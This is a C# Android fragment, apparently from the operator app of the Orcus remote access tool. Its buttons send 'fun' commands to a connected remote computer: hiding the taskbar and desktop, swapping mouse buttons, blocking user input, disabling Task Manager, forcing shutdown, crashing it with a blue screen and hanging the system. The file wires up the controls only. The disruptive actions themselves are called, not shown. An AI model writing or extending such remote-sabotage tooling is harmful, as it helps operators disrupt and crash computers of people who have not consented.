using System;
using Android.App;
using Android.OS;
using Android.Views;
using Android.Widget;

namespace Orcus.Administration.App
{
	public class FunFragment : Fragment
	{
		public override void OnCreate (Bundle savedInstanceState)
		{
			base.OnCreate (savedInstanceState);

			// Create your fragment here
		}

		public override View OnCreateView (LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState)
		{
			// Use this to return your custom view for this Fragment
			// return inflater.Inflate(Resource.Layout.YourFragment, container, false);

			var view = inflater.Inflate (Resource.Layout.FunFragment, null);
			var funCommand = ConnectionManager.Current.CurrentController.Commander.GetCommand<FunCommand> ();

			view.FindViewById<Button>(Resource.Id.ShowTaskbarButton).Click += (sender, e) => funCommand.ShowTaskbar();
			view.FindViewById<Button>(Resource.Id.HideTaskbarButton).Click += (sender, e) => funCommand.HideTaskbar();
			view.FindViewById<Button>(Resource.Id.ShowDesktopButton).Click += (sender, e) => funCommand.ShowDesktop();
			view.FindViewById<Button>(Resource.Id.HideDesktopButton).Click += (sender, e) => funCommand.HideDesktop();
			view.FindViewById<Button>(Resource.Id.ShowClockButton).Click += (sender, e) => funCommand.ShowClock();
			view.FindViewById<Button>(Resource.Id.HideClockButton).Click += (sender, e) => funCommand.HideClock();
			view.FindViewById<Button>(Resource.Id.SwapMouseButton).Click += (sender, e) => funCommand.SwapMouseButtons();
			view.FindViewById<Button>(Resource.Id.RestoreMouseButton).Click += (sender, e) => funCommand.RestoreMouseButtons();
			view.FindViewById<Button>(Resource.Id.ShutdownButton).Click += (sender, e) => funCommand.Shutdown();
			view.FindViewById<Button>(Resource.Id.LogOffButton).Click += (sender, e) => funCommand.LogOff();
			view.FindViewById<Button>(Resource.Id.RestartButton).Click += (sender, e) => funCommand.Restart();

			var enableTaskManagerButton = view.FindViewById<Button>(Resource.Id.EnableTaskmanagerButton);
			var disableTaskManagerButton = view.FindViewById<Button>(Resource.Id.DisableTaskmanagerButton);
			enableTaskManagerButton.Enabled = ConnectionManager.Current.CurrentController.Client.IsAdministrator;
			disableTaskManagerButton.Enabled = ConnectionManager.Current.CurrentController.Client.IsAdministrator;
			enableTaskManagerButton.Click += (object sender, EventArgs e) => funCommand.EnableTaskmanager();
			disableTaskManagerButton.Click += (sender, e) => funCommand.DisableTaskmanager();

			view.FindViewById<Button>(Resource.Id.SwapMouseButton).Click += (sender, e) => funCommand.SwapMouseButtons();
			view.FindViewById<Button>(Resource.Id.RestoreMouseButton).Click += (sender, e) => funCommand.RestoreMouseButtons();
			view.FindViewById<Button>(Resource.Id.BlockUserInputButton).Click += (sender, e) => {
				int duration;
				if(int.TryParse(view.FindViewById<TextView>(Resource.Id.BlockUserInputTextView).Text, out duration))
					funCommand.BlockUserInput(duration);
			};
			view.FindViewById<Button>(Resource.Id.BlockUserInputButton).Enabled = ConnectionManager.Current.CurrentController.Client.IsAdministrator;

			view.FindViewById<Button>(Resource.Id.HoldMouseButton).Click += (object sender, EventArgs e) => {
				int duration;
				if(int.TryParse(view.FindViewById<TextView>(Resource.Id.HoldMouseTextBox).Text, out duration))
					funCommand.HoldMouse(duration);
			};

			view.FindViewById<Button> (Resource.Id.TriggerBlueScreenButton).Click += (sender, e) => {
				if(Activity != null)
					new AlertDialog.Builder(Activity)
						.SetPositiveButton("Yes", (s, args) =>
							{
								funCommand.TriggerBluescreen ();
							})
						.SetNegativeButton("Cancel", (s2, args) =>
							{
								// User pressed no 
							})
						.SetMessage("Are you sure that you want to crash the remote computer?")
						.SetTitle("Warning")
						.Show();
			};
			view.FindViewById<Button> (Resource.Id.TriggerBlueScreenButton).Enabled = ConnectionManager.Current.CurrentController.Client.IsAdministrator || ConnectionManager.Current.CurrentController.Client.IsServiceRunning;
			view.FindViewById<Button> (Resource.Id.HangSystemButton).Click += (sender, e) => funCommand.HangSystem ();

			return view;
		}
	}
}